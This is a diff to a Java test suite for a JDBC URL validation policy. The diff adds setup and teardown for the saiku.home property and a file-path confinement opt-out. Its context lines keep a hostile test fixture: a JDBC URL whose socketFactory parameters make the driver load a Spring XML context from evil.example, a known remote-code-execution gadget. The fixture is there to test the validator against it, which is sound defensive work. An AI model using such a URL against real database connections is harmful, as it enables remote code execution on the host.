@@ -22,9 +22,24 @@ public class JdbcUrlPolicyTest {
             + "?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext"
             + "&socketFactoryArg=http://evil.example/ctx.xml";
 
+    private String savedHome;
+
+    @org.junit.Before
+    public void setSaikuHome() {
+        // saiku#2320: H2 file URLs are confined to saiku.home, which the launcher always sets.
+        savedHome = System.getProperty("saiku.home");
+        System.setProperty("saiku.home", "/opt/saiku-home");
+    }
+
     @After
     public void clearOperatorProperty() {
         System.clearProperty(JdbcUrlPolicy.ALLOWED_SCHEMES_PROPERTY);
+        System.clearProperty("saiku.jdbc.fileEngineConfinement");
+        if (savedHome == null) {
+            System.clearProperty("saiku.home");
+        } else {
+            System.setProperty("saiku.home", savedHome);
+        }
     }
 
     /* ------------------------------------------------------------------ accepts */
@@ -33,6 +48,9 @@ public class JdbcUrlPolicyTest {
     public void acceptsFoodmartSeedLocation_windows() {
         // The launcher's seeded datasource, exactly as SaikuOlapConnection hands it to the driver
         // (JdbcUser appended, trailing ';', H2 MODE= param inside the inner URL, file: catalog).
+        // A drive-letter path is relative on a unix test host, so this grammar test opts out of
+        // the saiku#2320 path confinement (covered in FileEngineConfinementTest).
+        System.setProperty("saiku.jdbc.fileEngineConfinement", "false");
         JdbcUrlPolicy.validate("jdbc:mondrian:Jdbc=jdbc:h2:C:/Users/me/saiku-home/data/foodmart;MODE=MySQL;"
                 + "Catalog=file:C:/Users/me/saiku-home/data/FoodMart4.xml;JdbcDrivers=org.h2.Driver;JdbcUser=sa;");
     }
